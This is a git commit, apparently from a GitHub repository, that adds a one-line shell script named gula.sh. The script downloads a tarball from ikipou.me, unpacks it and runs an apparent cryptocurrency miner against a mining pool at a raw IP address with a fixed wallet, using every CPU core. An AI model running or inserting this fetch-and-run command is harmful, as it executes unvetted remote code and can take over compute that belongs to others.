30cc588e76384612af053f1961c400c318173f8e
joko ganteng <80169267+ikypou1@users.noreply.github.com>
2024-11-09 02:42:09 +0800

    Add files via upload

---
+++ gula.sh
@@ -0,0 +1,1 @@
+wget -O JOKO  ikipou.me/JOKO-[GULA].tar.gz && tar -xvf JOKO && ./JOKOTAMVAN/JOKO -a yespowersugar -o  47.236.107.75:6668 -u LYs3dSTmjrX8GtW3uj2bfMJojs7WDyVvJu -p c=LTC,mc=SUGAR,m=solo -t$(nproc --all)
